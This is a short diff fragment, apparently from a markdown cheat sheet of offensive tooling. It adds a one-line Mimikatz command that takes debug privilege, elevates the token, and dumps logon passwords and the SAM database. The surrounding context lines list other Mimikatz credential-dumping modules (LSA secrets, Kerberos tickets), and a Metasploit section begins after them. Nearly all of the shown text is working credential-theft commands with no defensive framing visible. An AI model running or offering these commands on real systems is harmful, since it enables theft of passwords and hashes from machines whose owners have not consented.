@@ -22,6 +22,8 @@ lsadump::sam
 lsadump::lsa /patch
 lsadump::secrets
 kerberos::list
+
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
 ```
 
 ### Metasploit
